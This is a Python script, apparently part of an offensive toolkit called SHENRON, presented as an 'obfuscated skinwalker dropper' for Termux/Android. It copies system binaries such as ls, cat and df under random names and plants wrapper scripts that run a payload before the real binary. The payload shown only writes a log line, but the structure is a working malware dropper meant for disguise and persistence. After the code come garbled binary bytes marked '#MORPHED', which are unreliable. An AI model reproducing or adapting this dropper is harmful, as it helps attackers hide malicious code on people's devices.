from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# SHENRON Layer: Obfuscated Skinwalker Dropper
# Clones system binaries with fake names and plants active payloads

import os
import shutil
import base64
import random
import string
import subprocess

FAKE_BIN_DIR = os.path.expanduser("~/SHENRON/bin/")
MIMIC_TARGETS = ["/system/bin/ls", "/system/bin/cat", "/system/bin/df"]
PAYLOAD_COMMAND = 'echo "[+] Skinwalker active" >> /data/data/com.termux/files/home/.walker_log'

def random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def clone_binary(original_path):
    if not os.path.exists(original_path):
        return None
    fake_name = random_name()
    fake_path = os.path.join(FAKE_BIN_DIR, fake_name)
    shutil.copy2(original_path, fake_path)
    os.chmod(fake_path, 0o755)
    print(f"[+] Cloned {original_path} to {fake_path}")
    return fake_path

def plant_payload(fake_binary):
    wrapper_script = fake_binary + "_wrapper.sh"
    with open(wrapper_script, "w") as f:
        f.write(f"#!/system/bin/sh\n{PAYLOAD_COMMAND}\nexec {fake_binary} \"$@\"")
    os.chmod(wrapper_script, 0o755)
    print(f"[âœ“] Payload wrapper created: {wrapper_script}")
    return wrapper_script

@register_payload(name="obfuscated_skinwalker_dropper_DonxKt_M5btpj_a5xN8N_oiD9gV_1sqOO2")
def main():
    os.makedirs(FAKE_BIN_DIR, exist_ok=True)
    for target in MIMIC_TARGETS:
        fake_bin = clone_binary(target)
        if fake_bin:
            plant_payload(fake_bin)

if __name__ == "__main__":
    main()

Iq1J¨Ø±İÔ*”ô½ù@#MORPHED

\âì”TBniùœ,Lq¡ÅJõr‚İ6@#MORPHED

ˆJ¢İ0k™c¾Äked`#(*qµ1¨ğ´’â}½£a
=½A…ÈÈ#MORPHED

Ù¹d<Feâ‚dÛ4aœırSAÇRø4ú¹cmë:&™Ÿq,|—Ã…ÏØøRxY³#MORPHED

Çàÿ}õjİ•0GèoŒ«G#ŒÌ§…I—}æÑP#MORPHED
